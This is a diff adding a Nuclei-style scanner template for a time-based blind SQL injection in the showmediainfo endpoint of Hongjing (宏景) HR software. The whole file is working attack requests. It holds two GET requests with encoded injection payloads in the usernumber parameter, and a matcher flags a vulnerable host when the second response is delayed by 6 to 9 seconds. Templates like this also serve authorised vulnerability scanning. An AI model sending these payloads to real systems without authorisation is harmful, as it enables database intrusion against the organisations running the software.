@@ -1,0 +1,25 @@
+id: hjerm-usernumber-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 宏景-showmediainfo-SQL注入漏洞.
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPaRZJpCZEpUlWj2w12PVFssPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+      - |
+        GET /workbench/duty/showmediainfo?kind=0&usernumber=0JALorlQogBNgRuaXkp7QCus5DXQ1K1RU60C2QunGQUgKkcXUh9HXukA75IwTpCaGcqFlluMQLvPAATTP2HJFPAATTPgvSl8mZXxPAATTP2HJFPAATTPe2LWnL7Rg2Ceg0zzONMioPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_2>=6  && duration_2<=9"
